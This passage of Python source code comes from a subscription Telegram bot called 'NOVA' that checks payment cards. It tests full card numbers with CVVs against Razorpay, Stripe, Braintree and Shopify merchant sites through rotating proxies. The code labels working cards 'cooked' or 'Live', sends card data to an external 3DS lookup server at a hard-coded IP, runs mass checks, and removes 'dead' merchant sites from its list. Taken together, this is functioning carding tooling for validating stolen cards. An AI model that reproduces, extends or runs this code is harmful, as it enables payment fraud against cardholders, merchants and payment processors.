    target = dm_target_user_id if dm_target_user_id else chat_id
    for key, caption, prefix in [
        ('cooked', '🔥 Cooked cards', 'cooked'),
        ('approved', '✅ Approved (Live)', 'approved'),
        ('error', '⚠️ Errors', 'errors')
    ]:
        items = results.get(key, [])
        if items:
            text = "\n".join([f"{cc} | {msg}" for cc, msg in items])
            fname = f"{prefix}_{chat_id}_{user_id}.txt"
            with open(fname, 'w') as f: f.write(text)
            with open(fname, 'rb') as f: safe_send(bot.send_document, target, f, caption=caption)
            try:
                os.remove(fname)
            except:
                pass

    if unchecked_ccs:
        unchecked_text = "\n".join(unchecked_ccs)
        fname = f"unchecked_{chat_id}_{user_id}.txt"
        with open(fname, 'w') as f: f.write(unchecked_text)
        with open(fname, 'rb') as f: safe_send(bot.send_document, target, f, caption="📋 Unchecked cards")
        try:
            os.remove(fname)
        except:
            pass

# ============================================================================
# VBV / 3DS CHECKER – unchanged
# ============================================================================
VBV_API_BASE = "http://2.25.67.110:5001"

def vbv_checker(ccx):
    result = {
        "status": "UNKNOWN",
        "enrolled": False,
        "response_text": "",
        "auth_description": "",
        "version": "2.2.0",
        "otp_required": False,
        "network": "Unknown",
        "raw_status": ""
    }
    try:
        parts = ccx.strip().split("|")
        if len(parts) < 4:
            result["status"] = "INVALID_FORMAT"
            return result
        cc, mm, yy, cvc = parts[0], parts[1].zfill(2), parts[2], parts[3].strip()
        data_str = f"{cc}|{mm}|{yy}|{cvc}"

        resp = requests.get(
            f"{VBV_API_BASE}/vbv_lookup",
            params={"cc": data_str},
            headers={"X-API-Key": "novaop"},
            timeout=120,
            verify=False
        )
        resp.raise_for_status()
        api_data = resp.json()

        vbv_status = api_data.get("vbv_status", "error")
        enrolled = api_data.get("enrolled", False)
        raw_status = vbv_status
        result["raw_status"] = raw_status
        result["enrolled"] = enrolled

        status_map = {
            "success": ("NOT_ENROLLED", False, "Passed ✅ (not enrolled)"),
            "vbv_required": ("VBV_ENROLLED", True, "OTP Required ⛔"),
            "challenge_required": ("CHALLENGE_REQUIRED", True, "Challenge Required (OTP/SMS needed)"),
            "authenticate_successful": ("AUTHENTICATE_SUCCESSFUL", False, "Frictionless Pass (auto-authenticated)"),
            "authenticate_frictionless_failed": ("AUTHENTICATE_FRICTIONLESS_FAILED", False, "Frictionless Failed (bank rejected)"),
            "authenticate_rejected": ("FAILED", False, "Authentication Rejected"),
            "lookup_error": ("ERROR", False, "Lookup Error"),
            "error": ("ERROR", False, "Error during lookup"),
        }
        mapped = status_map.get(vbv_status, ("UNKNOWN", False, f"Unknown ({vbv_status})"))
        result["status"] = mapped[0]
        result["otp_required"] = mapped[1]
        result["auth_description"] = mapped[2]

        if "version" in api_data:
            result["version"] = api_data["version"]
        if "network" in api_data:
            result["network"] = api_data["network"]
        else:
            first = cc[0]
            if first == "4":
                result["network"] = "Visa (VBV)"
            elif first in ["5", "2"]:
                result["network"] = "Mastercard (SecureCode)"
            elif cc.startswith("34") or cc.startswith("37"):
                result["network"] = "Amex (SafeKey)"
            else:
                result["network"] = "Unknown"

        result["response_text"] = f"Status: {vbv_status} – {mapped[2]}"
        return result

    except Exception as e:
        result["status"] = "ERROR"
        result["response_text"] = str(e)[:100]
        return result

def format_vbv_result(vbv_data, cc, bin_info=None):
    if bin_info is None:
        bin_info = get_bin_info(cc.split('|')[0])

    status = vbv_data.get("status", "UNKNOWN")
    enrolled = vbv_data.get("enrolled", False)
    auth_desc = vbv_data.get("auth_description", "")
    version = vbv_data.get("version", "2.2.0")
    otp_required = vbv_data.get("otp_required", False)
    network = vbv_data.get("network", "Unknown")

    if status == "NOT_ENROLLED":
        emoji = "🟢"
        label = "Not Enrolled"
    elif status == "CHALLENGE_REQUIRED":
        emoji = "🔴"
        label = "Challenge Required"
    elif status == "AUTHENTICATE_SUCCESSFUL":
        emoji = "🟢"
        label = "Authenticated (Frictionless Pass)"
    elif status == "AUTHENTICATE_FRICTIONLESS_FAILED":
        emoji = "🟡"
        label = "Frictionless Failed"
    elif status == "VBV_ENROLLED":
        emoji = "🔴"
        label = "VBV Enrolled"
    else:
        emoji = "⚪"
        label = status.replace("_", " ").title()

    bank = bin_info.get('bank', 'UNKNOWN')
    country = bin_info.get('country_name', 'UNKNOWN')
    flag = bin_info.get('country_flag', '🇺🇳')

    msg = f"""<b>{emoji} 3DS CHECK</b>
💳 <code>{cc}</code>

🏦 {bank}
🌍 {flag} {country}

🔒 Enrolled: {'Y' if enrolled else 'N'}
📋 Status: {label}
🔑 Auth: {auth_desc}
📦 Version: {version}
📱 OTP Required: {'Yes' if otp_required else 'No'}
🌐 Network: {network}

⚡ <b>Bot by Unknownop</b>"""
    return msg

# ============================================================================
# MAIN SETUP FUNCTION – ALL HANDLERS INSIDE
# ============================================================================
def setup_complete_handler(bot, site_filter_func, proxies_data,
                          check_site_func, is_valid_response_func,
                          process_response_func, update_stats_func,
                          save_json_func_param, load_json_func_param,
                          is_user_allowed_func, users_data_ref, users_file_param,
                          force_subscribe_decorator=None,
                          user_sessions=None):
    global is_user_allowed, load_json_func, save_json_func, users_file, get_filtered_sites_func, is_valid_response
    get_filtered_sites_func = site_filter_func

    def extract_cc(text):
        import re
        parts = []
        cleaned = re.sub(r'[^\d|:./ ]', '', text)
        if '|' in cleaned:
            parts = cleaned.split('|')
        elif ':' in cleaned:
            parts = cleaned.split(':')
        elif '.' in cleaned:
            parts = cleaned.split('.')
        elif '/' in cleaned:
            parts = cleaned.split('/')
        else:
            if len(cleaned) >= 16:
                cc = cleaned[:16]
                rest = cleaned[16:]
                if len(rest) >= 4:
                    mm = rest[:2]
                    rest = rest[2:]
                    if len(rest) >= 4:
                        yyyy = rest[:4] if len(rest) >= 4 else rest[:2]
                        rest = rest[4:] if len(rest) >= 4 else rest[2:]
                        if len(rest) >= 3:
                            cvv = rest[:3]
                            parts = [cc, mm, yyyy, cvv]
        if len(parts) < 4:
            return None
        cc = parts[0].strip()
        mm = parts[1].strip().zfill(2)
        yyyy = parts[2].strip()
        cvv = parts[3].strip()
        if len(yyyy) == 2:
            from datetime import datetime
            current_year_short = datetime.now().year % 100
            year_int = int(yyyy)
            yyyy = f"20{yyyy}" if year_int >= current_year_short else f"19{yyyy}"
        return f"{cc}|{mm}|{yyyy}|{cvv}"

    is_user_allowed = is_user_allowed_func
    load_json_func = load_json_func_param
    save_json_func = save_json_func_param
    users_file = users_file_param
    get_filtered_sites_func = get_filtered_sites_func
    is_valid_response = is_valid_response_func
    if user_sessions is not None:
        user_sessions_global = globals().get('user_sessions', {})
        user_sessions_global.clear()
        user_sessions_global.update(user_sessions)

    # ====================================================================
    # COMMAND: /clearproxies – clear all personal proxies (user)
    # ====================================================================
    @bot.message_handler(commands=['clearproxies'])
    def handle_clear_proxies(message):
        user_id = message.from_user.id
        if not is_user_allowed(user_id):
            access_denied(message, "You need a subscription to clear your proxies.")
            return
        # Confirm with the user
        markup = types.InlineKeyboardMarkup()
        markup.add(
            types.InlineKeyboardButton("✅ Yes, clear all", callback_data="clearproxies_yes"),
            types.InlineKeyboardButton("❌ No, keep", callback_data="clearproxies_no")
        )
        safe_send(bot.reply_to, message,
            "⚠️ <b>Are you sure?</b>\n\n"
            "This will remove <b>all</b> your personal proxies from both Shopify and Razorpay pools.\n"
            "You can then upload fresh ones via file or /addpro.",
            parse_mode='HTML', reply_markup=markup)

    # ====================================================================
    # CALLBACK for /clearproxies
    # ====================================================================
    @bot.callback_query_handler(func=lambda call: call.data.startswith("clearproxies_"))
    def clearproxies_callback(call):
        try:
            bot.answer_callback_query(call.id)
        except:
            pass
        user_id = call.from_user.id
        chat_id = call.message.chat.id

        if call.data == "clearproxies_yes":
            user_proxies = get_user_proxies(user_id)
            user_proxies["shopify"] = []
            user_proxies["razorpay"] = []
            save_user_proxies(user_id, user_proxies)
            msg_text = "✅ <b>All your personal proxies have been cleared.</b>\n\nYou can now add new proxies using /addpro or uploading a .txt file."
        else:
            msg_text = "❌ Proxy clearing cancelled. Your proxies are safe."

        try:
            bot.edit_message_text(msg_text, chat_id, call.message.message_id, parse_mode='HTML')
        except Exception:
            bot.send_message(chat_id, msg_text, parse_mode='HTML')

        try:
            bot.delete_message(chat_id, call.message.message_id)
        except:
            pass

    # ====================================================================
    # COMMAND: /cleanshpro – test all user proxies for Shopify
    # ====================================================================
    @bot.message_handler(commands=['cleanshpro'])
    def handle_clean_shopify_proxies(message):
        user_id = message.from_user.id
        if not is_user_allowed(user_id):
            access_denied(message, "You need a subscription to use this command.")
            return
        user_data = get_user_proxies(user_id)
        all_proxies = user_data.get("shopify", []) + user_data.get("razorpay", [])
        all_proxies = list(dict.fromkeys(all_proxies))
        if not all_proxies:
            safe_send(bot.reply_to, message, "You have no proxies in your pools. Add some via /addpro or file upload.")
            return

        status_msg = safe_send(bot.reply_to, message, f"🔍 Testing {len(all_proxies)} proxies for Shopify...", parse_mode='HTML')
        live = []
        total = len(all_proxies)
        checked = 0

        def test_one(p):
            return p, _hard_cap(test_proxy_for_shopify, p, timeout=30)

        with ThreadPoolExecutor(max_workers=100) as ex:
            futures = {ex.submit(test_one, p): p for p in all_proxies}
            for fut in as_completed(futures):
                p, ok = fut.result()
                checked += 1
                if ok:
                    live.append(p)
                if checked % 50 == 0:
                    try:
                        safe_send(bot.edit_message_text,
                            f"🔍 Testing for Shopify: {checked}/{total}\n✅ Live: {len(live)}",
                            message.chat.id, status_msg.message_id, parse_mode='HTML')
                    except:
                        pass
        current = get_user_proxies(user_id)
        current["shopify"] = live
        save_user_proxies(user_id, current)
        for p in live:
            add_global_proxy(p, "shopify")

        safe_send(bot.edit_message_text,
            f"✅ Shopify proxy pool updated.\n\nLive: {len(live)}/{total}\n"
            f"These proxies are now in your Shopify pool and will be used for Shopify mass checks.",
            message.chat.id, status_msg.message_id, parse_mode='HTML')

    # ====================================================================
    # COMMAND: /cleanrzpro – test all user proxies for Razorpay
    # ====================================================================
    @bot.message_handler(commands=['cleanrzpro'])
    def handle_clean_razorpay_proxies(message):
        user_id = message.from_user.id
        if not is_user_allowed(user_id):
            access_denied(message, "You need a subscription to use this command.")
            return
        user_data = get_user_proxies(user_id)
        all_proxies = user_data.get("shopify", []) + user_data.get("razorpay", [])
        all_proxies = list(dict.fromkeys(all_proxies))
        all_proxies = [p for p in all_proxies if len(p.split(':')) == 4]
        if not all_proxies:
            safe_send(bot.reply_to, message, "No authenticated proxies found in your pools. Razorpay requires `ip:port:user:pass` format.")
            return

        status_msg = safe_send(bot.reply_to, message, f"🔍 Testing {len(all_proxies)} proxies for Razorpay...", parse_mode='HTML')
        live = []
        total = len(all_proxies)
        checked = 0

        def test_one(p):
            return p, test_proxy_for_razorpay(p)

        with ThreadPoolExecutor(max_workers=30) as ex:
            futures = {ex.submit(test_one, p): p for p in all_proxies}
            for fut in as_completed(futures):
                p, ok = fut.result()
                checked += 1
                if ok:
                    live.append(p)
                if checked % 50 == 0:
                    try:
                        safe_send(bot.edit_message_text,
                            f"🔍 Testing for Razorpay: {checked}/{total}\n✅ Live: {len(live)}",
                            message.chat.id, status_msg.message_id, parse_mode='HTML')
                    except:
                        pass
        current = get_user_proxies(user_id)
        current["razorpay"] = live
        save_user_proxies(user_id, current)
        for p in live:
            add_global_proxy(p, "razorpay")

        safe_send(bot.edit_message_text,
            f"✅ Razorpay proxy pool updated.\n\nLive: {len(live)}/{total}\n"
            f"These proxies are now in your Razorpay pool and will be used for /mrz and Razorpay mass checks.",
            message.chat.id, status_msg.message_id, parse_mode='HTML')

    # ====================================================================
    # ACCESS DENIED HELPER
    # ====================================================================
    def access_denied(message, reason="You need an active subscription to use this bot.\nPlease purchase a plan or contact support."):
        full_msg = (
            f"🚫 <b>Access Denied</b>\n\n"
            f"{reason}\n\n"
            f"<i>Contact owner: @Unknown_bolte</i>"
        )
        safe_send(bot.reply_to, message, full_msg, parse_mode='HTML')

    # ====================================================================
    # INLINE STOP HANDLER
    # ====================================================================
    @bot.callback_query_handler(func=lambda call: call.data == "stop_mass")
    def inline_stop(call):
        try:
            bot.answer_callback_query(call.id)
        except:
            pass
        chat_id = call.message.chat.id
        user_id = call.from_user.id
        set_stop(chat_id, user_id)
        try:
            safe_send(bot.edit_message_text, call.message.text + "\n\n⏹ <b>Stop requested for your session...</b>",
                      chat_id, call.message.message_id, parse_mode="HTML")
        except:
            pass

    # ====================================================================
    # COMMAND: /mode
    # ====================================================================
    @bot.message_handler(commands=['mode'])
    def mode_command(message):
        user_id = message.from_user.id
        parts = message.text.split()
        if len(parts) == 1:
            current = get_user_preference(user_id)
            safe_send(bot.reply_to, message, f"🔔 Your current mode: <b>{current}</b>\n\n"
                     "Use /mode individual to receive hits as individual messages.\n"
                     "Use /mode final to receive only a final summary with files.", parse_mode='HTML')
            return
        mode = parts[1].lower()
        if mode not in ['individual', 'final']:
            safe_send(bot.reply_to, message, "❌ Invalid mode. Use 'individual' or 'final'.", parse_mode='HTML')
            return
        set_user_preference(user_id, mode)
        safe_send(bot.reply_to, message, f"✅ Mode changed to <b>{mode}</b>.", parse_mode='HTML')

    # ====================================================================
    # PERSONAL SITES
    # ====================================================================
    @bot.message_handler(commands=['addmysite'])
    def add_my_site(message):
        user_id = message.from_user.id
        if not is_user_allowed(user_id):
            access_denied(message, "You need a subscription to add personal sites.")
            return
        try:
            _, url = message.text.split(maxsplit=1)
            url = url.strip()
            if not url.startswith("https://"):
                safe_send(bot.reply_to, message, "❌ Please provide a full URL (https://...)", parse_mode='HTML')
                return
        except:
            safe_send(bot.reply_to, message, "❌ Usage: /addmysite <url>\nExample: /addmysite https://shop.site.com", parse_mode='HTML')
            return
        sites = get_user_sites(user_id)
        new_site = {
            "url": url,
            "name": url.split("//")[1].split("/")[0],
            "price": "0.00",
            "gateway": "Shopify"
        }
        sites.append(new_site)
        save_user_sites_list(user_id, sites)
        safe_send(bot.reply_to, message, f"✅ Added personal site:\n{url}", parse_mode='HTML')

    @bot.message_handler(commands=['mysites'])
    def list_my_sites(message):
        user_id = message.from_user.id
        sites = get_user_sites(user_id)
        if not sites:
            safe_send(bot.reply_to, message, "You have no personal sites.\nAdd with /addmysite <url>", parse_mode='HTML')
            return

        lines = []
        for i, s in enumerate(sites, 1):
            name = s.get('name', s['url'].replace('https://', '').replace('http://', '').split('/')[0])
            price = s.get('price', '0.00')
            lines.append(f"{i}. {s['url']} (${price}) - {name}")

        text = "\n".join(lines)

        if len(text) > 3900:
             filename = f"mysites_{user_id}.txt"
             with open(filename, 'w', encoding='utf-8') as f:
                 f.write("Your Personal Sites\n")
                 f.write("━━━━━━━━━━━━━━━━━━━\n")
                 f.write(text)
             with open(filename, 'rb') as f:
                 safe_send(bot.send_document, message.chat.id, f, caption=f"📋 Your {len(sites)} personal sites")
             os.remove(filename)
        else:
             safe_send(bot.reply_to, message, f"<b>📋 Your Personal Sites ({len(sites)})</b>\n\n{text}", parse_mode='HTML')

    # ====================================================================
    # RAZORPAY SITE COMMANDS
    # ====================================================================
    @bot.message_handler(commands=['addrz'])
    def add_rz_site(message):
        user_id = message.from_user.id
        if not is_user_allowed(user_id):
            access_denied(message)
            return
        try:
            _, url = message.text.split(maxsplit=1)
            url = url.strip()
        except:
            safe_send(bot.reply_to, message, "❌ Usage: /addrz <url>", parse_mode='HTML')
            return
        if not is_valid_razorpay_url(url):
            safe_send(bot.reply_to, message,
                "❌ Invalid URL. Must be:\n"
                "- https://razorpay.me/@handle\n"
                "- https://pages.razorpay.com/handle\n"
                "- https://pages.razorpay.com/pl_XXXXX[/view]",
                parse_mode='HTML')
            return
        sites = load_rz_sites()
        if url in sites:
            safe_send(bot.reply_to, message, "⚠️ Site already exists.", parse_mode='HTML')
            return
        valid, msg = validate_razorpay_site(url)
        if not valid:
            safe_send(bot.reply_to, message, f"❌ Site validation failed: {msg}\nNot added.", parse_mode='HTML')
            return
        sites.append(url)
        save_rz_sites(sites)
        safe_send(bot.reply_to, message, f"✅ Added: {url}\nTotal: {len(sites)}", parse_mode='HTML')

    @bot.message_handler(commands=['removerz'])
    def remove_rz_site(message):
        user_id = message.from_user.id
        if not is_user_allowed(user_id):
            access_denied(message)
            return
        try:
            _, url = message.text.split(maxsplit=1)
            url = url.strip()
        except:
            safe_send(bot.reply_to, message, "❌ Usage: /removerz <url>", parse_mode='HTML')
            return
        sites = load_rz_sites()
        if url not in sites:
            safe_send(bot.reply_to, message, "❌ Site not found.", parse_mode='HTML')
            return
        sites.remove(url)
        save_rz_sites(sites)
        safe_send(bot.reply_to, message, f"✅ Removed: {url}\nRemaining: {len(sites)}", parse_mode='HTML')

    @bot.message_handler(commands=['listrz'])
    def list_rz_sites_cmd(message):
        sites = load_rz_sites()
        if not sites:
            safe_send(bot.reply_to, message, "No Razorpay sites added. Use /addrz to add.", parse_mode='HTML')
            return
        text = "<b>Razorpay Sites ({})</b>\n".format(len(sites))
        for site in sites:
            short_id = hashlib.md5(site.encode()).hexdigest()[:5]
            text += f"🆔 <code>{short_id}</code> → {site}\n"
        safe_send(bot.reply_to, message, text, parse_mode='HTML')

    @bot.message_handler(commands=['rmrzid'])
    def remove_rz_site_by_id(message):
        user_id = message.from_user.id
        if not is_user_allowed(user_id):
            access_denied(message)
            return
        try:
            _, short_id = message.text.split(maxsplit=1)
            short_id = short_id.strip().lower()
        except:
            safe_send(bot.reply_to, message, "❌ Usage: /rmrzid <short_id>", parse_mode='HTML')
            return
        sites = load_rz_sites()
        found = None
        for site in sites:
            if hashlib.md5(site.encode()).hexdigest()[:5] == short_id:
                found = site
                break
        if not found:
            safe_send(bot.reply_to, message, f"❌ No site found with ID <code>{short_id}</code>.", parse_mode='HTML')
            return
        sites.remove(found)
        save_rz_sites(sites)
        safe_send(bot.reply_to, message, f"✅ Removed: <code>{found}</code>\nRemaining: {len(sites)}", parse_mode='HTML')

    @bot.message_handler(commands=['uploadrz'])
    def upload_rz_prompt(message):
        user_id = message.from_user.id
        if not is_user_allowed(user_id):
            access_denied(message)
            return
        safe_send(bot.reply_to, message, "📂 <b>Send me a .txt file with one Razorpay site per line.</b>", parse_mode='HTML')
        user_sessions[user_id] = user_sessions.get(user_id, {})
        user_sessions[user_id]['awaiting_rz_file'] = True

    @bot.message_handler(commands=['cleanrz'])
    def clean_rz_sites_cmd(message):
        user_id = message.from_user.id
        if not is_user_allowed(user_id):
            access_denied(message)
            return
        sites = load_rz_sites()
        if not sites:
            safe_send(bot.reply_to, message, "❌ No Razorpay sites to clean.")
            return
        safe_send(bot.reply_to, message, f"🧹 Testing {len(sites)} sites – removing dead ones...")
        test_cc = "4517650667292635|08|2028|261"
        proxies = get_active_proxies(user_id, "razorpay") or []
        dead_keywords = [
            "the server encountered an error",
            "order creation failed",
            "no razorpay data found",
            "invalid merchant",
            "merchant disabled",
            "account suspended",
            "something went wrong",
            "404 not found"
        ]
        kept = []
        removed = 0
        lock = threading.Lock()

        def test_site(site):
            proxy = random.choice(proxies) if proxies else None
            msg, status = check_razorpay(test_cc, proxy=proxy, site=site)
            if status == "ERROR" and any(kw in msg.lower() for kw in dead_keywords):
                return site, False
            valid_keywords = [
                "temporary block", "international", "risk", "cvv", "insufficient",
                "card_not_enrolled", "payment_risk_check_failed", "card_declined"
            ]
            if any(kw in msg.lower() for kw in valid_keywords):
                return site, True
            if status in ["DECLINED", "APPROVED"]:
                return site, True
            return site, False

        with ThreadPoolExecutor(max_workers=30) as ex:
            futures = {ex.submit(test_site, site): site for site in sites}
            for future in as_completed(futures):
                site = futures[future]
                try:
                    _, keep = future.result(timeout=20)
                    with lock:
                        if keep:
                            kept.append(site)
                        else:
                            removed += 1
                            reset_rz_fail_count(site)
                except:
                    with lock:
                        removed += 1
                        reset_rz_fail_count(site)

        save_rz_sites(kept)
        safe_send(bot.send_message, message.chat.id,
            f"✅ Razorpay sites cleaned:\n"
            f"🗑️ Removed: {removed}\n"
            f"💎 Kept: {len(kept)}",
            parse_mode='HTML')

    # ====================================================================
    # COMMAND: /stop
    # ====================================================================
    @bot.message_handler(commands=['stop'])
    def handle_stop(message):
        chat_id = message.chat.id
        user_id = message.from_user.id
        set_stop(chat_id, user_id)
        safe_send(bot.reply_to, message,
            "⏸️ <b>Stop requested.</b>\n\n"
            "• Pending cards cancelled.\n"
            "• Current card finishes soon.\n"
            "• Unchecked cards will be saved.\n\n"
            "<i>Please wait...</i>",
            parse_mode='HTML')

    # ====================================================================
    # COMMAND: /vbv /3ds
    # ====================================================================
    @bot.message_handler(commands=['vbv', '3ds'])
    def handle_vbv_check(message):
        user_id = message.from_user.id
        if message.chat.id != FREE_GROUP_ID and not is_user_allowed(user_id):
            access_denied(message, "You need a subscription to use this checker.")
            return
        text = message.text.strip()
        parts = text.split(maxsplit=1)
        if len(parts) < 2:
            safe_send(bot.reply_to, message, "❌ Usage: /vbv <card>\nExample: /vbv 4012888888881881|12|2026|123", parse_mode='HTML')
            return
        ccs = extract_cards_from_text(parts[1])
        if not ccs:
            safe_send(bot.reply_to, message, "❌ No valid card found.", parse_mode='HTML')
            return
        cc = ccs[0]
        msg_check = safe_send(bot.reply_to, message, f"🔍 Checking 3DS status for <code>{cc}</code>...", parse_mode='HTML')
        vbv_result = vbv_checker(cc)
        bin_info = get_bin_info(cc.split('|')[0])
        formatted = format_vbv_result(vbv_result, cc, bin_info)
        if msg_check:
            try:
                safe_send(bot.edit_message_text, formatted, message.chat.id, msg_check.message_id, parse_mode='HTML')
            except:
                safe_send(bot.send_message, message.chat.id, formatted, parse_mode='HTML')
        else:
            safe_send(bot.send_message, message.chat.id, formatted, parse_mode='HTML')

    # ====================================================================
    # COMMAND: /rz (single check)
    # ====================================================================
    @bot.message_handler(commands=['rz'])
    def handle_rz_single(message):
        import html
        user_id = message.from_user.id
        if message.chat.id != FREE_GROUP_ID and not is_user_allowed(user_id):
            access_denied(message, "🚫 This gate is for premium users only.")
            return
        text = message.text.strip()
        parts = text.split(maxsplit=1)
        if len(parts) < 2:
            safe_send(bot.reply_to, message, "❌ Use: /rz <card>", parse_mode='HTML')
            return

        cc = extract_cc(parts[1])
        if not cc:
            safe_send(bot.reply_to, message, "❌ Invalid card format. Use CC|MM|YYYY|CVV", parse_mode='HTML')
            return

        proxies = get_active_proxies(user_id, "razorpay")
        proxy = random.choice(proxies) if proxies else None
        args = parts[1].split()
        site = None
        if len(args) > 1:
            site = args[1]
        if not site:
            sites = load_rz_sites()
            if sites:
                site = sites[0]

        user_mention = f'<a href="tg://user?id={user_id}">{html.escape(message.from_user.first_name or "User")}</a>'
        loading_msg = safe_send(bot.reply_to, message,
            f"⏳ <b>NOVA IS WORKING . . . .</b>\n\n"
            f"💳 Card    » <code>{cc}</code>\n"
            f"🌐 Gateway » <b>Razorpay</b>\n"
            f"🔍 Status  » <i>Loading Your Response...</i>\n\n"
            f"⚡ Powered by  @Unknown_bolte",
            parse_mode='HTML')

        msg, status = check_razorpay(cc, proxy=proxy, site=site)

        color = "🟢" if status == 'APPROVED' else "🔴" if status == 'DECLINED' else "⚠️"
        bin_info = get_bin_info(cc.split('|')[0])
        safe_msg = html.escape(msg)
        result_text = (
            f"<b>🔹 Razorpay ₹1 Check</b>\n"
            f"💳 <code>{cc}</code>\n"
            f"📋 {color} {safe_msg}\n\n"
            f"🏦 Bank: {bin_info.get('bank','?')}\n"
            f"🌍 {bin_info.get('country_name','?')} {bin_info.get('country_flag','')}\n"
            f"👤 <b>Request by:</b> {user_mention}\n"
            f"━━━━━━━━━━━━━━\n"
            f"<i>⚡ NOVA · <a href='tg://user?id=5963548505'>⏤‌‌Unknownop ꯭𖠌</a></i>"
        )

        if loading_msg:
            try:
                safe_send(bot.edit_message_text, result_text, message.chat.id, loading_msg.message_id, parse_mode='HTML')
            except:
                safe_send(bot.send_message, message.chat.id, result_text, parse_mode='HTML')
        else:
            safe_send(bot.send_message, message.chat.id, result_text, parse_mode='HTML')

    # ====================================================================
    # COMMAND: /b3 (Stripe Auth)
    # ====================================================================
    @bot.message_handler(commands=['b3'])
    def handle_b3_single(message):
        user_id = message.from_user.id
        if not is_user_allowed(user_id):
            access_denied(message, "🚫 This gate is for premium users only.")
            return
        text = message.text.strip()
        parts = text.split(maxsplit=1)
        if len(parts) < 2:
            safe_send(bot.reply_to, message, "❌ Use: /b3 <card>", parse_mode='HTML')
            return
        ccs = extract_cards_from_text(parts[1])
        if not ccs:
            safe_send(bot.reply_to, message, "❌ No valid card found.", parse_mode='HTML')
            return
        cc = ccs[0]

        proxies = get_active_proxies(user_id, "shopify")
        proxy = random.choice(proxies) if proxies else None
        msg, status = check_stripe_auth(cc, proxy=proxy)
        bin_info = get_bin_info(cc.split('|')[0])
        status_text = "Approved ✅" if status == 'APPROVED' else "Declined ❌" if status == 'DECLINED' else "Error ⚠️"
        safe_msg = html.escape(msg)
        result_msg = (
            f"<b>🔹 Stripe B3 Auth</b>\n"
            f"💳 <code>{cc}</code>\n"
            f"📋 {status_text}\n"
            f"📋 Response: {safe_msg}\n\n"
            f"🏦 Bank: <b>{bin_info.get('bank','?')}</b>\n"
            f"🌍 {bin_info.get('country_name','?')} {bin_info.get('country_flag','')}\n"
            f"━━━━━━━━━━━━━━\n"
            f"<i>⚡ NOVA · <a href='tg://user?id=5963548505'>⏤‌‌Unknownop ꯭𖠌</a></i>"
        )
        safe_send(bot.reply_to, message, result_msg, parse_mode='HTML')

    # ====================================================================
    # COMMAND: /br (Braintree)
    # ====================================================================
    @bot.message_handler(commands=['br'])
    def handle_braintree_single(message):
        user_id = message.from_user.id
        if not is_user_allowed(user_id):
            access_denied(message, "🚫 This gate is for premium users only.")
            return
        text = message.text.strip()
        parts = text.split(maxsplit=1)
        if len(parts) < 2:
            safe_send(bot.reply_to, message, "❌ Use: /br <card>", parse_mode='HTML')
            return
        ccs = extract_cards_from_text(parts[1])
        if not ccs:
            safe_send(bot.reply_to, message, "❌ No valid card found.", parse_mode='HTML')
            return
        cc = ccs[0]
        proxies = get_active_proxies(user_id, "shopify")
        proxy = random.choice(proxies) if proxies else None
        msg, status = check_braintree_api(cc, proxy=proxy)
        bin_info = get_bin_info(cc.split('|')[0])
        status_text = "Approved ✅" if status == 'APPROVED' else "Declined ❌" if status == 'DECLINED' else "Error ⚠️"
        safe_msg = html.escape(msg)
        result_msg = (
            f"<b>🔹 Braintree Auth (API)</b>\n"
            f"💳 <code>{cc}</code>\n"
            f"📋 {status_text}\n"
            f"📋 Response: {safe_msg}\n\n"
            f"🏦 Bank: <b>{bin_info.get('bank','?')}</b>\n"
            f"🌍 {bin_info.get('country_name','?')} {bin_info.get('country_flag','')}\n"
            f"━━━━━━━━━━━━━━\n"
            f"<i>⚡ NOVA · <a href='tg://user?id=5963548505'>⏤‌‌Unknownop ꯭𖠌</a></i>"
        )
        safe_send(bot.reply_to, message, result_msg, parse_mode='HTML')

    # ====================================================================
    # MASS COMMANDS – inline and file upload triggers (they call the processing functions)
    # ====================================================================
    @bot.message_handler(commands=['msh'])
    def handle_msh_command(message):
        user_id = message.from_user.id
        chat_id = message.chat.id
        if not is_user_allowed(user_id):
            access_denied(message)
            return

        parts = message.text.split(maxsplit=1)
        if len(parts) < 2:
            safe_send(bot.reply_to, message,
                "❌ <b>Usage:</b> <code>/msh CC|MM|YYYY|CVV CC2|MM|... </code>\n\n"
                "📌 <b>Example:</b>\n"
                "<code>/msh 4111111111111111|12|2028|123 5111111111111111|10|2027|456</code>\n\n"
                "💡 <b>Tips:</b>\n"
                "• Separate cards with a space, comma, or newline.\n"
                "• All cards must be in the format <code>CC|MM|YYYY|CVV</code>.\n"
                "• The bot will automatically remove expired cards.\n"
                "• Your daily and per‑upload limits apply.\n\n"
                "📂 <i>For larger lists, upload a .txt file via the main menu.</i>",
                parse_mode='HTML')
            return

        raw_text = parts[1]
        ccs = extract_cards_from_text(raw_text)
        if not ccs:
            safe_send(bot.reply_to, message,
                "❌ No valid cards found. Format: <code>CC|MM|YYYY|CVV</code>",
                parse_mode='HTML')
            return

        limit = get_user_upload_limit(user_id, load_json_func, users_file)
        if len(ccs) > limit and user_id not in OWNER_ID:
            ccs = ccs[:limit]
            safe_send(bot.send_message, chat_id,
                f"⚠️ Truncated to {limit} cards (your per‑upload limit).",
                parse_mode='HTML')

        if user_id not in OWNER_ID:
            remaining = get_user_daily_remaining(user_id, load_json_func, users_file)
            if remaining < len(ccs):
                safe_send(bot.reply_to, message,
                    f"❌ Daily limit exceeded. You have {remaining} cards left today.",
                    parse_mode='HTML')
                return

        sites = get_filtered_sites_func()
        if not sites:
            safe_send(bot.reply_to, message,
                "❌ No Shopify sites available. Add via Site Manager or <code>/addmysite</code>.",
                parse_mode='HTML')
            return

        proxies = get_active_proxies(user_id, "shopify")
        if not proxies:
            safe_send(bot.reply_to, message,
                "🚫 No Shopify proxies. Add via <code>/addpro</code> or <code>/cleanpro</code>.",
                parse_mode='HTML')
            return

        active_proxies = validate_proxies_strict(proxies, bot, message)
        if not active_proxies:
            safe_send(bot.reply_to, message,
                "❌ All your Shopify proxies are dead. Add fresh proxies.",
                parse_mode='HTML')
            return

        if is_user_busy(user_id):
            safe_send(bot.reply_to, message,
                "⏳ You have an active check. Use <code>/stop</code> first.",
                parse_mode='HTML')
            return

        if not mass_check_semaphore.acquire(blocking=False):
            safe_send(bot.reply_to, message,
                "⚠️ Too many mass checks globally. Please wait.",
                parse_mode='HTML')
            return

        set_user_busy(user_id, True)
        start_msg = safe_send(bot.send_message, chat_id,
            f"🔥 <b>Starting Shopify Multi‑Site (inline)</b>\n"
            f"💳 {len(ccs)} Cards\n"
            f"🔌 {len(active_proxies)} Proxies\n"
            f"🌐 {len(sites)} Sites",
            parse_mode='HTML')

        def mass_thread():
            try:
                process_shopify_mass_check(
                    bot, message, start_msg, ccs, sites, active_proxies,
                    user_id, load_json_func, save_json_func, users_file,
